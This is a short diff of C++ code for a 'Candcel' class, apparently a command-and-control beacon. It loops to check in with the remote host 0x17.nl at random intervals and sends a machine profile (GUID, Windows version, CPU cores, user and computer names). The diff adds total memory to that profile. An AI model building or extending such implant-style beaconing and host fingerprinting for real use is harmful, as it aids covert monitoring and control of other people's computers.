@@ -31,7 +31,7 @@ DWORD Candcel::CheckIn()
 	while (true) {
 		int nextInterval = (rand() % (10 + 1)) + 5;
 
-		Log::Instance()->write(L"Candcel", L"Sending checkin request, then after " + std::to_wstring(nextInterval) + L" minutes");
+		Log::Instance()->write(L"Candcel", L"Sending checkin request, interval " + std::to_wstring(nextInterval) + L" minutes");
 
 		RestClient rc("0x17.nl", "avc_endpoint.php");
 
@@ -62,6 +62,7 @@ void Candcel::Solicit()
 	obj[L"guid"] = new JSONValue(Config::Guid());
 	obj[L"winver"] = new JSONValue(Util::winver());
 	obj[L"corenum"] = new JSONValue(std::to_wstring(Util::cpuCores()));
+	obj[L"maxmem"] = new JSONValue(std::to_wstring(Util::maxmem()));
 	obj[L"user"] = new JSONValue(Util::user());
 	obj[L"computer"] = new JSONValue(Util::machine());
 
